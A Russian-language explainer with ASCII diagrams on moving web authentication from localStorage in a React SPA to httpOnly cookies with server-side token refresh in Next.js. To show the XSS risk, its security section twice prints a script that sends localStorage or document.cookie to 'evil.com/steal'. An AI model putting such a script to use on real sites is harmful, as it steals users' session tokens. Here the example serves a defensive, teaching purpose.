# Визуальная схема работы с токенами

## 🔄 Сравнение: SPA vs Next.js

### ❌ Старая SPA архитектура

```
┌──────────────┐
│   Browser    │
│  (React SPA) │
└──────┬───────┘
       │ localStorage.getItem('user')
       │ token = user.accessToken
       │
       │ if (user.exp - now < 10) {
       │   refreshToken(user.refreshToken)
       │ }
       │
       │ fetch(BACKEND_URL + '/api/projects', {
       │   headers: { Authorization: `Bearer ${token}` }
       │ })
       │
       ▼
┌──────────────┐
│   Backend    │
│     API      │
└──────────────┘

ПРОБЛЕМЫ:
❌ Токены доступны из JavaScript (XSS уязвимость)
❌ Нет SSR (медленный первый рендер)
❌ Сложная логика обновления токенов на клиенте
❌ Токены могут быть украдены через XSS
```

### ✅ Новая Next.js архитектура

```
┌──────────────────────────────────────────────────────────┐
│                    Browser (Client)                      │
│  • Токены в httpOnly cookies (JS не видит)               │
│  • Простой fetch('/api/projects')                        │
│  • Автоматическая передача cookies                       │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ▼
┌──────────────────────────────────────────────────────────┐
│              Next.js API Route (Server)                  │
│  • Читает httpOnly cookies                               │
│  • Проверяет exp                                         │
│  • Обновляет токены если нужно                           │
│  • Делает запрос к бэкенду                               │
└────────────────────┬─────────────────────────────────────┘
                     │
                     ▼
┌──────────────────────────────────────────────────────────┐
│                   Backend API                            │
│  • Получает Bearer token                                 │
│  • Возвращает данные                                     │
└──────────────────────────────────────────────────────────┘

ПРЕИМУЩЕСТВА:
✅ Токены защищены (httpOnly cookies)
✅ SSR - быстрый первый рендер
✅ Простая клиентская логика
✅ Автоматическое управление токенами
✅ Единая точка авторизации
```

## 📱 Детальные сценарии

### Сценарий 1: Первая загрузка страницы (SSR)

```
┌─────────┐
│  User   │ Открывает /projects
└────┬────┘
     │
     ▼
┌────────────────────────────────────────────────┐
│         Next.js Server (SSR)                   │
│                                                │
│  1. Middleware проверяет cookies               │
│     accessToken? ✓   refreshToken? ✓           │
│     → Пропускает запрос                        │
│                                                │
│  2. Server Component рендерится                │
│     ServerAuth.getTokens()                     │
│     → {accessToken, refreshToken, expiresAt}   │
│                                                │
│  3. ServerAuth.isTokenExpired()                │
│     exp: 1761573754                            │
│     now: 1761573744                            │
│     diff: 10 секунд                            │
│     → NOT expired ✓                            │
│                                                │
│  4. serverApiClient.request()                  │
│     fetch(BACKEND + '/api/projects', {         │
│       headers: {                               │
│         Authorization: `Bearer ${token}`       │
│       }                                        │
│     })                                         │
│                                                │
│  5. Backend возвращает проекты                 │
│     → [project1, project2, ...]                │
│                                                │
│  6. Рендерит HTML с данными                    │
└────┬───────────────────────────────────────────┘
     │
     ▼
┌─────────┐
│  User   │ Видит страницу с данными СРАЗУ! ⚡
└─────────┘

Время: ~200-500ms (быстро!)
```

### Сценарий 2: Загрузка с истекшим токеном

```
┌─────────┐
│  User   │ Открывает /projects (токен истёк)
└────┬────┘
     │
     ▼
┌────────────────────────────────────────────────┐
│         Next.js Server (SSR)                   │
│                                                │
│  1. ServerAuth.getTokens() ✓                   │
│                                                │
│  2. ServerAuth.isTokenExpired()                │
│     exp: 1761573744                            │
│     now: 1761573754                            │
│     diff: -10 секунд                           │
│     → EXPIRED! ⚠️                               │
│                                                │
│  3. ServerAuth.refreshTokens()                 │
│     POST BACKEND/refresh-tokens                │
│     Body: { refreshToken: "XYZ..." }           │
│     ↓                                          │
│     Response: {                                │
│       accessToken: "NEW_TOKEN",                │
│       refreshToken: "NEW_REFRESH",             │
│       exp: 1761574654 (новое время)            │
│     }                                          │
│     ↓                                          │
│     Сохраняет новые токены в cookies ✓         │
│                                                │
│  4. serverApiClient.request()                  │
│     fetch с НОВЫМ токеном                      │
│                                                │
│  5. Backend возвращает проекты ✓               │
│                                                │
│  6. Рендерит HTML с данными                    │
└────┬───────────────────────────────────────────┘
     │
     ▼
┌─────────┐
│  User   │ Видит страницу, не знает о refresh! 🎉
└─────────┘

Время: ~500-800ms (всё ещё быстро!)
```

### Сценарий 3: Клик "Обновить список" (CSR)

```
┌─────────┐
│  User   │ Нажимает кнопку "Обновить список"
└────┬────┘
     │
     ▼
┌────────────────────────────────────────────────┐
│         Browser (Client)                       │
│                                                │
│  onClick={() => {                              │
│    fetch('/api/projects')  ← К Next.js!        │
│  }}                                            │
└────┬───────────────────────────────────────────┘
     │ Cookies автоматически передаются
     │
     ▼
┌────────────────────────────────────────────────┐
│    Next.js API Route: /api/projects/route.ts   │
│                                                │
│  export async function GET(request) {          │
│                                                │
│    1. ServerAuth.getTokens()                   │
│       Читает httpOnly cookies ✓                │
│                                                │
│    2. if (await ServerAuth.isTokenExpired()) { │
│         ServerAuth.refreshTokens()             │
│         ↓                                      │
│         POST BACKEND/refresh-tokens            │
│         ↓                                      │
│         Обновляет cookies с новыми токенами    │
│       }                                        │
│                                                │
│    3. const validTokens = getTokens()          │
│                                                │
│    4. fetch(BACKEND + '/api/projects', {       │
│         Authorization: `Bearer ${token}`       │
│       })                                       │
│                                                │
│    5. return NextResponse.json(data)           │
│  }                                             │
└────┬───────────────────────────────────────────┘
     │
     ▼
┌────────────────────────────────────────────────┐
│         Browser (Client)                       │
│                                                │
│  .then(data => setProjects(data))              │
│                                                │
│  UI обновляется ✓                              │
└────────────────────────────────────────────────┘

Пользователь НЕ ЗНАЕТ о проверке/обновлении токенов! 🎯
```

### Сценарий 4: Неудачный refresh (токен полностью истёк)

```
┌─────────┐
│  User   │ Делает действие (токены истекли давно)
└────┬────┘
     │
     ▼
┌────────────────────────────────────────────────┐
│    Next.js API Route                           │
│                                                │
│  1. ServerAuth.isTokenExpired() → true         │
│                                                │
│  2. ServerAuth.refreshTokens()                 │
│     POST BACKEND/refresh-tokens                │
│     ↓                                          │
│     Response: 401 Unauthorized ❌              │
│     (refresh token тоже истёк)                 │
│                                                │
│  3. ServerAuth.clearAuth()                     │
│     Удаляет все cookies                        │
│                                                │
│  4. return NextResponse.json(                  │
│       { error: "Token refresh failed" },       │
│       { status: 401 }                          │
│     )                                          │
└────┬───────────────────────────────────────────┘
     │ status: 401
     ▼
┌────────────────────────────────────────────────┐
│         Browser (Client)                       │
│                                                │
│  if (response.status === 401) {                │
│    window.location.href = '/login'             │
│  }                                             │
└────┬───────────────────────────────────────────┘
     │
     ▼
┌─────────┐
│  User   │ Редирект на страницу логина
└─────────┘
```

## ⏱️ Временная шкала токенов

```
Логин (время 0)
│
├─ accessToken создан (exp: 0 + 15 минут)
├─ refreshToken создан (exp: 0 + 7 дней)
│
▼ Время идёт...
│
├─ 14 минут 50 секунд
│  └─ exp <= now + 10
│      → isTokenExpired() = true
│      → Автоматически обновляется при следующем запросе
│
├─ 15 минут (accessToken истёк)
│  └─ Но уже обновился на предыдущем шаге!
│
├─ Новый accessToken создан (exp: 15 мин + 15 минут)
│
▼ И так далее...
│
├─ 7 дней (refreshToken истекает)
│  └─ Следующая попытка refresh вернёт 401
│      → Пользователь перенаправляется на /login
│
└─ Требуется новый логин
```

## 🔐 Безопасность: localStorage vs httpOnly Cookies

### ❌ localStorage (старый SPA подход)

```
┌──────────────────────────────────────────────┐
│           Browser Memory                     │
│                                              │
│  localStorage.user = {                       │
│    accessToken: "ABC123...",  ← ВИДНО В JS! │
│    refreshToken: "XYZ789..."  ← УЯЗВИМО!    │
│  }                                           │
│                                              │
│  Любой JS код может прочитать:              │
│  > localStorage.getItem('user')              │
│  > "{ accessToken: 'ABC123...' }"            │
│                                              │
│  XSS атака:                                  │
│  <script>                                    │
│    fetch('evil.com/steal', {                 │
│      body: localStorage.getItem('user')      │
│    })                                        │
│  </script>                                   │
│                                              │
│  ❌ Токены украдены!                         │
└──────────────────────────────────────────────┘
```

### ✅ httpOnly Cookies (новый Next.js подход)

```
┌──────────────────────────────────────────────┐
│           Browser Memory                     │
│                                              │
│  Cookies (httpOnly: true):                   │
│    accessToken: "ABC123..."  ← НЕ ВИДНО В JS│
│    refreshToken: "XYZ789..." ← ЗАЩИЩЕНО! ✅  │
│                                              │
│  JavaScript не может прочитать:              │
│  > document.cookie                           │
│  > "theme=dark; language=ru"                 │
│  > (httpOnly cookies НЕ показываются)        │
│                                              │
│  XSS атака:                                  │
│  <script>                                    │
│    fetch('evil.com/steal', {                 │
│      body: document.cookie  // Только public │
│    })                                        │
│  </script>                                   │
│                                              │
│  ✅ Токены в безопасности!                   │
│                                              │
│  Cookies автоматически передаются только в:  │
│  • Server Components                         │
│  • API Routes                                │
│  • Middleware                                │
└──────────────────────────────────────────────┘
```

## 🎯 Ключевые отличия от старой системы

| Аспект                 | SPA (старое)               | Next.js (новое)              |
| ---------------------- | -------------------------- | ---------------------------- |
| **Хранение токенов**   | localStorage (уязвимо)     | httpOnly cookies (безопасно) |
| **Доступ из JS**       | ✅ Да (плохо!)             | ❌ Нет (хорошо!)             |
| **Первый рендер**      | Пустая страница → Загрузка | Страница с данными сразу     |
| **Обновление токенов** | Клиент (сложно)            | Сервер (просто)              |
| **API запросы**        | Прямо к бэкенду            | Через Next.js прокси         |
| **Управление exp**     | В миллисекундах (путаница) | В секундах (правильно)       |
| **Обработка 401**      | В каждом компоненте        | Централизованно              |
| **SEO**                | ❌ Плохо                   | ✅ Отлично                   |
| **Security**           | ⚠️ XSS уязвимость          | ✅ Защищено                  |

## 📊 Производительность

### Старая SPA:

```
User → Пустая страница (100ms)
     → JS загружается (300ms)
     → React монтируется (200ms)
     → Проверка токенов (50ms)
     → Запрос к API (300ms)
     → Рендер данных (100ms)
────────────────────────────────
TOTAL: ~1050ms до контента! 😰
```

### Новая Next.js:

```
User → Страница с данными (200-500ms)
────────────────────────────────
TOTAL: ~200-500ms до контента! ⚡
```

**Улучшение: 2-5x быстрее! 🚀**

## ✅ Резюме

### Что происходит под капотом:

1. **Все токены в httpOnly cookies** - недоступны из JavaScript
2. **Автоматическая проверка перед каждым запросом** - exp сравнивается с текущим временем
3. **Автоматическое обновление** - если токен истёк, вызывается refresh
4. **Прозрачность для пользователя** - он не знает о токенах
5. **Единая точка управления** - вся логика в ServerAuth

### Что нужно помнить:

- ⏰ `exp` в **секундах**, не миллисекундах!
- 🔒 Токены **недоступны** из JavaScript
- 🔄 Обновление **автоматическое** при каждом запросе
- 🚀 SSR даёт **быстрый** первый рендер
- 🔐 httpOnly cookies = **безопасность**

Теперь у вас современная, безопасная и быстрая система авторизации! 🎉
